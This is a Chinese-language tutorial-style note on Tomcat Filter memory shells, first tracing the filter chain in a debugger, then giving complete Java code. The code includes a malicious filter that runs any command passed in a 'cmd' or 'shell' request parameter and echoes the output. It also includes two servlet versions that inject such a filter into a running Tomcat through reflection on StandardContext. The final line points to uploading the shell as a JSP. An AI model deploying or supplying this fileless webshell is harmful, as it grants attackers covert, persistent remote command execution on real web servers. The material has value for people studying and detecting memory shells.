
## 原理
在[Java Web基础](../../Java%20Web/Java%20Web基础.md)里面有提到客户端的请求是经过了Filter的过滤后才交给servlet处理的，就像下面的代码
*servlet.java*
```java
package org.example.demo;  
  
import javax.servlet.*;  
import javax.servlet.http.*;  
import javax.servlet.annotation.*;  
import java.io.IOException;  
  
@WebServlet(name = "Servlet", value = "/Servlet")  
public class Servlet extends HttpServlet {  
    @Override  
    public void init() throws ServletException {  
        System.out.println("servlet初始化");  
    }  
  
    @Override  
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
        System.out.println("Servlet处理请求");  
        response.getWriter().println("<html>\n" +  
                "<body>\n" +  
                "<h2>Hello wuwumonster </h2>\n" +  
                "</body>\n" +  
                "</html>\n");  
    }  
  
    @Override  
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
  
    }  
  
    @Override  
    public void destroy() {  
        System.out.println("Servlet销毁");  
        super.destroy();  
    }  
}
```
*filter1.java*
```java
package org.example.demo.filter;  
  
import javax.servlet.*;  
import javax.servlet.annotation.*;  
import java.io.IOException;  
  
@WebFilter(filterName = "Filter1", urlPatterns = "/Servlet")  
public class Filter1 implements Filter {  
    public void init(FilterConfig config) throws ServletException {  
        System.out.println("Filter1创建");  
    }  
  
    public void destroy() {  
        System.out.println("Filter1销毁");  
    }  
  
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {  
        System.out.println("Filter1执行");  
        chain.doFilter(request, response);  
    }  
}
```

处理的请求就像这样

![](attachments/Pasted%20image%2020230312225836.png)

>所以说，只要在程序中注册一个恶意的filter并使其处于Filter链的最前面，就可以确保我们的请求能够去触发这个恶意的filter

## Filter执行流程分析
在filter1中调用`doFilter`的地方下断点进行调试

![](attachments/Pasted%20image%2020230312230852.png)

在执行请求后可以看到基本的函数调用

![](attachments/Pasted%20image%2020230312233716.png)

但是在这个时候我们步入是无法看到函数流程的，需要导入对应的`catalina`和`tomcat`的jar包

这个时候就可以直观的看到代码了

代码执行,现在在`ApplicationFilterChain`，看名字的话大概可以知道是做了一个全局安全的开启检查，然后就直接进到`else`中，调用`internaklDoFilter()`

![](attachments/Pasted%20image%2020230313090949.png)

在`internalDoFilter`中这个if能够看得出来是有对Filter的遍历获取

![](attachments/Pasted%20image%2020230313091634.png)

![](attachments/Pasted%20image%2020230313091757.png)

这里有两个filter但是只有第一个是我们自己写的filter，pos为1时获取的是tomcat的filter,调试的时候进来pos就是1
进行`getFilter`，这里已经是一个新的class叫做`ApplicationFilterConfi

```java
Filter getFilter() throws ClassCastException, ClassNotFoundException, IllegalAccessException, InstantiationException, ServletException, InvocationTargetException, NamingException, IllegalArgumentException, NoSuchMethodException, SecurityException {  
    if (this.filter != null) {  
        return this.filter;  
    } else {  
        String filterClass = this.filterDef.getFilterClass();  
        this.filter = (Filter)this.getInstanceManager().newInstance(filterClass);  
        this.initFilter();  
        return this.filter;  
    }  
}
```

getFilter

![](attachments/Pasted%20image%2020230313100914.png)

getFilter后，又对当前的Filter进行doFilter

![](attachments/Pasted%20image%2020230313100818.png)

可以看到这个doFilter是tomcat.websocket.server中WsFilter.class中的,但是调试还是直接就跳到了最后，chan.doFilter,然后跳回去原来的ApplicationFilterChain，这个时候pos就等于2了

```java
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {  
    if (this.sc.areEndpointsRegistered() && UpgradeUtil.isWebSocketUpgradeRequest(request, response)) {  
        HttpServletRequest req = (HttpServletRequest)request;  
        HttpServletResponse resp = (HttpServletResponse)response;  
        String pathInfo = req.getPathInfo();  
        String path;  
        if (pathInfo == null) {  
            path = req.getServletPath();  
        } else {  
            path = req.getServletPath() + pathInfo;  
        }  
  
        WsMappingResult mappingResult = this.sc.findMapping(path);  
        if (mappingResult == null) {  
            chain.doFilter(request, response);  
        } else {  
            UpgradeUtil.doUpgrade(this.sc, req, resp, mappingResult.getConfig(), mappingResult.getPathParams());  
        }  
    } else {  
        chain.doFilter(request, response);  
    }  
}
```

![](attachments/Pasted%20image%2020230313102459.png)

往下走实质上就是最后的doFilter去调用servlet来响应请求`this.servlet.service(request, response);`

![](attachments/Pasted%20image%2020230313102722.png)

到现在为止是对Filter执行链条的分析，如果想要实现注册恶意Filter的话，还需要去关注在这之前的Filter的创建

![](attachments/Pasted%20image%2020230313103505.png)

注意这些invoke方法会发现，和之前的四个容器的层次是一样的，那么按照==Engine->Host->Context->Wrapper==的顺序来进行invoke

![](attachments/Pasted%20image%2020230313104148.png)

逐个向上看去的话会发现到最后的StandardWrapperValue中调用doFilter然后开始上面分析过的流程
在最后这个invoke这里可以看得到有一个`createFilterChain`的函数

![](attachments/Pasted%20image%2020230313105340.png)

传进去能够看到有一个`findFilterConfig`的过程

![](attachments/Pasted%20image%2020230313105713.png)

下面的那个addFilter其实也就是不断向Filter的配置数组里不断放东西

![](attachments/Pasted%20image%2020230313110210.png)

所以一个完整的流程就是
管道调用Engine->Host->Context->Wrapper，在最后创建一个FilterChain，在FilterChain中不断进行doFilter()的调用，直到最后一个filter执行doFilter来调用servlet，在前面分析的过程中能够知道，注册恶意的Filter的关键的Filterconfig，结合注册需要的FilterMap                                                                                                                                       
基于前面得基础知识Standrad是一个最小得容器类，加载了Servlet，Filter等数据、对象和映射关系，这其中自然包括了，FilterMap得
在StandradContext这个类里面

![](attachments/Pasted%20image%2020230313111716.png)

在*StandardContext*里面其实能够看到这几个都是hashmap

![](attachments/Pasted%20image%2020230313113152.png)

在context中也很清晰，这些hashmap中的存放

![](attachments/Pasted%20image%2020230313113340.png)

但是filter的使用是基于filterchain的，回到调试的调用中去看看

![](attachments/Pasted%20image%2020230313122104.png)

**思路**
现在可以基本确定，想要编写一个Filter的内存马需要
- 当前的servletcontext
- filterconfigs
- 要注入的恶意filter对象
- filterdef

## 内存马编写

### 恶意Filter
```java
package org.example.demo.filter;  
  
import javax.servlet.*;  
import javax.servlet.annotation.*;  
import java.io.IOException;  
  
@WebFilter(filterName = "evilFilter", urlPatterns = "/*")  
public class evilFilter implements Filter {  
    public void init(FilterConfig config) throws ServletException {  
    }  
  
    public void destroy() {  
    }  
  
  
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {  
        if(request.getParameter("cmd")!=null) {  
            java.io.InputStream in  = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();  
            int a = -1;  
            byte[] b = new byte[2048];  
            response.getWriter().println("<pre>");  
            while ((a = in.read(b))!=-1) {  
                response.getWriter().println(new String(b));  
            }  
            response.getWriter().println("</pre>");  
        }  
        chain.doFilter(request, response);  
    }  
}
```

![](attachments/Pasted%20image%2020230313145258.png)



```java
package org.example.demo;  
  
import org.apache.catalina.Context;  
import org.apache.catalina.core.ApplicationContext;  
import org.apache.catalina.core.ApplicationFilterConfig;  
import org.apache.catalina.core.StandardContext;  
import org.apache.tomcat.util.descriptor.web.FilterDef;  
import org.apache.tomcat.util.descriptor.web.FilterMap;  
  
  
import javax.servlet.*;  
import javax.servlet.annotation.WebServlet;  
import javax.servlet.http.*;  
  
import java.io.IOException;  
import java.io.InputStream;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.util.Map;  
import java.util.Scanner;  
  
@WebServlet(name = "wuwumonster", value = "/wuwumonster")  
public class ServletFilterShell extends HttpServlet {  
  
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
        this.doPost(request, response);  
    }  
  
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
        Field Configs;  
        Map filterConfigs;  
        try {  
            //获取上下文  
            ServletContext servletContext = request.getServletContext();  
  
            //反射获取standard context  
  
  
            Field appctx = servletContext.getClass().getDeclaredField("context");  
            appctx.setAccessible(true);  
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
  
            Field stdctx = applicationContext.getClass().getDeclaredField("context");  
            stdctx.setAccessible(true);  
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
            //设置恶意的filter类  
            String Filtername = "Filter_Shell";  
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
            Configs.setAccessible(true);  
            filterConfigs = (Map) Configs.get(standardContext);  
  
            if (filterConfigs.get(Filtername) == null) {  
                Filter filter = new Filter() {  
                    @Override  
                    public void init(FilterConfig config) throws ServletException {  
                    }  
  
                    @Override  
                    public void destroy() {  
                    }  
  
                    @Override  
                    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {  
                        if(request.getParameter("shell")!=null) {  
                            java.io.InputStream in  = Runtime.getRuntime().exec(request.getParameter("shell")).getInputStream();  
                            byte[] b = new byte[2048];  
                            response.getWriter().println("<pre>");  
                            while ((in.read(b))!=-1) {  
                                response.getWriter().println(new String(b));  
                            }  
                            response.getWriter().println("</pre>");  
                        }  
                        chain.doFilter(request, response);  
                    }  
                };  
                //通过反射获取filterdef  
                Class<?> Filterdef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");  
                Constructor declaredConstructors = Filterdef.getDeclaredConstructor();  
                FilterDef obj = (FilterDef) declaredConstructors.newInstance();  
                obj.setFilter(filter);  
                obj.setFilterName(Filtername);  
                obj.setFilterClass(filter.getClass().getName());  
                standardContext.addFilterDef(obj);  
  
                //反射获取filtermap  
                Class<?> Filtermap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");  
                Constructor<?> mapConstructor = Filtermap.getDeclaredConstructor();  
                org.apache.tomcat.util.descriptor.web.FilterMap obj2 = (FilterMap) mapConstructor.newInstance();  
  
                obj2.addURLPattern("/*");  
                obj2.setFilterName(Filtername);  
                obj2.setDispatcher(DispatcherType.REQUEST.name());  
                standardContext.addFilterMapBefore(obj2);  
  
                //反射拿  filterconfig，并将其传入进行注册
                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");  
                Constructor<?> configConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);  
                configConstructor.setAccessible(true);  
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) configConstructor.newInstance(standardContext,obj);  
                filterConfigs.put(Filtername, filterConfig);  
                response.getWriter().write("SUCCESS");  
            }  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
}
```

![](attachments/Pasted%20image%2020230313200457.png)

发现在回显这里其实我这样的写法可能会收到原页面的影响，最好的其实是下面这种,黑色很帅

```java
package org.example.demo;  
  
import org.apache.catalina.Context;  
import org.apache.catalina.core.ApplicationContext;  
import org.apache.catalina.core.ApplicationFilterConfig;  
import org.apache.catalina.core.StandardContext;  
import org.apache.tomcat.util.descriptor.web.FilterDef;  
import org.apache.tomcat.util.descriptor.web.FilterMap;  
  
  
import javax.servlet.*;  
import javax.servlet.annotation.WebServlet;  
import javax.servlet.http.*;  
  
import java.io.IOException;  
import java.io.InputStream;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.util.Map;  
import java.util.Scanner;  
  
@WebServlet(name = "wuwumonster", value = "/wuwumonster")  
public class ServletFilterShell extends HttpServlet {  
  
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
        this.doPost(request, response);  
    }  
  
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
        Field Configs;  
        Map filterConfigs;  
        try {  
            //获取上下文  
            ServletContext servletContext = request.getServletContext();  
  
            //反射获取standard context  
  
  
            Field appctx = servletContext.getClass().getDeclaredField("context");  
            appctx.setAccessible(true);  
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
  
            Field stdctx = applicationContext.getClass().getDeclaredField("context");  
            stdctx.setAccessible(true);  
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
            //设置恶意的filter类  
            String Filtername = "Filter_Shell";  
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
            Configs.setAccessible(true);  
            filterConfigs = (Map) Configs.get(standardContext);  
  
            if (filterConfigs.get(Filtername) == null) {  
                Filter filter = new Filter() {  
                    @Override  
                    public void init(FilterConfig config) throws ServletException {  
                    }  
  
                    @Override  
                    public void destroy() {  
                    }  
  
                    @Override  
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
                        HttpServletRequest req = (HttpServletRequest) servletRequest;  
                        if (req.getParameter("cmd") != null){  
                            System.out.println("do some bad bad");  
  
                            InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
//  
                            Scanner s = new Scanner(in).useDelimiter("\\A");  
                            String output = s.hasNext() ? s.next() : "";  
                            servletResponse.getWriter().write(output);  
  
                            return; }  
                        filterChain.doFilter(servletRequest,servletResponse);  
                    }  
                };  
                //通过反射获取filterdef  
                Class<?> Filterdef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");  
                Constructor declaredConstructors = Filterdef.getDeclaredConstructor();  
                FilterDef obj = (FilterDef) declaredConstructors.newInstance();  
                obj.setFilter(filter);  
                obj.setFilterName(Filtername);  
                obj.setFilterClass(filter.getClass().getName());  
                standardContext.addFilterDef(obj);  
  
                //反射获取filtermap  
                Class<?> Filtermap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");  
                Constructor<?> mapConstructor = Filtermap.getDeclaredConstructor();  
                org.apache.tomcat.util.descriptor.web.FilterMap obj2 = (FilterMap) mapConstructor.newInstance();  
  
                obj2.addURLPattern("/*");  
                obj2.setFilterName(Filtername);  
                obj2.setDispatcher(DispatcherType.REQUEST.name());  
                standardContext.addFilterMapBefore(obj2);  
  
                //反射拿  
                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");  
                Constructor<?> configConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);  
                configConstructor.setAccessible(true);  
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) configConstructor.newInstance(standardContext,obj);  
                filterConfigs.put(Filtername, filterConfig);  
                response.getWriter().write("SUCCESS");  
            }  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
}
```

![](attachments/Pasted%20image%2020230313200620.png)

如果是在上传文件中的利用，则上传jsp形式的文件